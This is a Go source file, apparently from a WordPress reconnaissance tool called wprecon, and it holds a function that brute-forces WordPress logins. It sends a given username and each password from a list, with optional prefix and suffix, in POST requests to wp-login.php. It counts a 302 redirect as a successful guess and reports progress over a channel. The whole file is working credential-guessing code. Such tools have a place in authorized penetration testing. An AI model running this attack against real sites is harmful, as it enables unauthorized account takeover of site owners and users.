package fuzzing

import (
	"fmt"
	httplib "net/http"
	"net/url"

	"github.com/blackbinn/wprecon/internal/database"
	"github.com/blackbinn/wprecon/pkg/gohttp"
	"github.com/blackbinn/wprecon/pkg/printer"
)

func WPLogin(channel chan [2]int, username string, passwords []string) {
	http := gohttp.NewHTTPClient()
	http.SetMethod("POST")
	http.SetURL(database.Memory.GetString("Target")).SetURLDirectory("wp-login.php")
	http.SetContentType("application/x-www-form-urlencoded")
	http.FirewallDetection(true)

	var pprefix = database.Memory.GetString("Passwords Prefix")
	var psuffix = database.Memory.GetString("Passwords Suffix")

	var done bool

	req := func(password string) bool {
		http.SetForm(&url.Values{"log": {username}, "pwd": {pprefix + password + psuffix}})
		http.SetRedirectFunc(func(req *httplib.Request, via []*httplib.Request) error {
			if req.Response.StatusCode == 302 {
				done = true
			}

			return nil
		})

		_, err := http.Run()

		if err != nil {
			printer.Danger(fmt.Sprintf("%s", err))
		}

		return done
	}

	for count, password := range passwords {
		done := req(password)

		if done {
			channel <- [2]int{1, count}
			break
		} else if 1+count == len(passwords) {
			channel <- [2]int{0, count}
			break
		} else {
			channel <- [2]int{0, count}
		}

	}
}
